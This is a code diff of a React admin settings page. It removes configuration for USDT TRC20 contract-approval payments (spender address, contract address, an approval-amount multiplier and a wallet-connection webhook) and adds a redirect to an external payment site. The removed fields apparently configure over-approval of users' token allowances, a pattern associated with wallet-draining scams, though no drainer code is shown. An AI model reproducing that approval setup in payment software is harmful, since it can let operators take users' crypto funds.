@@ -129,11 +129,8 @@ export default function AdminSettingsPage() {
 
   const getSettingLabel = (key: string) => {
     const labels: Record<string, string> = {
-      'spender_address': 'USDT 收款地址 (Spender)',
-      'usdt_contract_address': 'USDT 合约地址',
-      'approval_multiplier': '授权额度倍数',
+      'payment_platform_id': '支付网关商户标识 (platform)',
       'support_link': '客服链接',
-      'webhook_url': 'Webhook URL (钱包连接事件)',
     };
     return labels[key] || key;
   };
@@ -196,20 +193,20 @@ export default function AdminSettingsPage() {
                 </CardContent>
               </Card>
 
-              {/* Payment Settings Card */}
+              {/* Payment Gateway Card */}
               <Card>
                 <CardHeader>
                   <CardTitle className="flex items-center gap-2">
                     <Wallet className="h-5 w-5" />
-                    支付设置
+                    支付网关设置
                   </CardTitle>
                   <CardDescription>
-                    配置 USDT TRC20 合约授权支付相关参数
+                    配置跳转到 payusdt.shop 的商户标识 (platform 参数)
                   </CardDescription>
                 </CardHeader>
                 <CardContent className="space-y-4">
                   {settings
-                    .filter(s => ['spender_address', 'usdt_contract_address', 'approval_multiplier'].includes(s.key))
+                    .filter(s => ['payment_platform_id'].includes(s.key))
                     .map((setting) => (
                       <div key={setting.key}>
                         <label className="block text-sm font-medium mb-2">
@@ -222,50 +219,12 @@ export default function AdminSettingsPage() {
                           <Input
                             value={setting.value}
                             onChange={(e) => handleSettingChange(setting.key, e.target.value)}
-                            placeholder={setting.description || ''}
-                            className="flex-1"
-                          />
-                        </div>
-                        {setting.description && (
-                          <p className="text-xs text-muted-foreground mt-1">{setting.description}</p>
-                        )}
-                      </div>
-                    ))}
-                </CardContent>
-              </Card>
-
-              {/* Webhook Settings Card */}
-              <Card>
-                <CardHeader>
-                  <CardTitle className="flex items-center gap-2">
-                    <Globe className="h-5 w-5" />
-                    Webhook 设置
-                  </CardTitle>
-                  <CardDescription>
-                    配置钱包连接和授权事件的回调地址
-                  </CardDescription>
-                </CardHeader>
-                <CardContent className="space-y-4">
-                  {settings
-                    .filter(s => ['webhook_url'].includes(s.key))
-                    .map((setting) => (
-                      <div key={setting.key}>
-                        <label className="block text-sm font-medium mb-2">
-                          {getSettingLabel(setting.key)}
-                        </label>
-                        <div className="flex items-center gap-2">
-                          <div className="p-2 bg-muted rounded-lg">
-                            {getSettingIcon(setting.key)}
-                          </div>
-                          <Input
-                            value={setting.value}
-                            onChange={(e) => handleSettingChange(setting.key, e.target.value)}
-                            placeholder="https://your-webhook-url.com/endpoint"
+                            placeholder="herosms"
                             className="flex-1"
                           />
                         </div>
                         <p className="text-xs text-muted-foreground mt-1">
-                          留空则不发送 webhook。当用户连接钱包或完成授权时，系统会向此 URL 发送 POST 请求。
+                          用户付款时跳转 https://payusdt.shop/?platform={`{此值}`}&order_id=...&amount=...
                         </p>
                       </div>
                     ))}
